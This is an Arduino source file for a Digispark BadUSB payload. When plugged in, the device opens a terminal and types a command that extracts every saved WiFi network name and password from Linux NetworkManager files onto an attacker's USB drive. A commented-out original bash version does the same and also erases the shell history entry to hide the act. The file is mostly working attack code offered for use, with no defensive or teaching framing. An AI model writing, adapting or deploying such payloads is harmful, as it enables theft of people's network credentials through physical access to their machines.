/**
 * @file WiFiPasswordExfiltration.ino
 * @brief This payload dumps all of a victim's SSID+PSK's
 * 
 * @copyright Copyright (c) Noé Ruano 2024
 * 
 */

/* Change to whichever layout you need (LAYOUT_{US_ENGLISH, NORWEGIAN, ITALIAN, etc.}) */
#define LAYOUT_SPANISH

#define DEVICE_UUID ""	// TODO: the flash drive's UUID where the passwords will be dumped

#include <DigiKeyboard.h>

void setup() { }

void loop()
{
	// A first delay so that we don't miss the first keyboard stroke
	DigiKeyboard.delay(500);

	// Open a terminal window
	DigiKeyboard.sendKeyStroke(KEY_T, MODIFIERKEY_LEFT_CTRL | MODIFIERKEY_LEFT_ALT);
	DigiKeyboard.delay(500);

	// Send payload
	DigiKeyboard.printf("route=$(lsblk -o +UUID | grep 68C2-60DC | awk '{print $7}')/passwords.out;pw_dir=\"/etc/NetworkManager/system-connections/\";for i in $(ls /etc/NetworkManager/system-connections/);do printf \"$(echo $i|awk -F '.' '{print $1}'): \">>$route;echo $(cat $pw_dir$i|grep \"psk=\"|awk -F '=' '{print $2}')>>$route;printf \"\n\">>$route;done;");

	DigiKeyboard.sendKeyStroke(KEY_ENTER);

	for (;;) {}
}

/**################################### ORIGINAL SCRIPT #############################################

#!/bin/bash

output_route=$(lsblk -o +UUID | grep <DEVICE_UUID> | awk '{print $7}')/passwords.out

for i in $(ls /etc/NetworkManager/system-connections/)
do
        # SSID exfiltration
        printf "## $(echo $i | awk -F '.' '{print $1}') ##\n"  >> $output_route

        # Password exfiltration
        echo $(cat /etc/NetworkManager/system-connections/$i | grep "psk=" | awk -F '=' '{print $2}') >> $output_route

        printf "\n" >> $output_route
done

# Clear last entry of history (doesn't work from inside a script, but it works in a one-liner)
history -d $(history | tail -n 1 | awk '{print $1}')

##################################################################################################*/

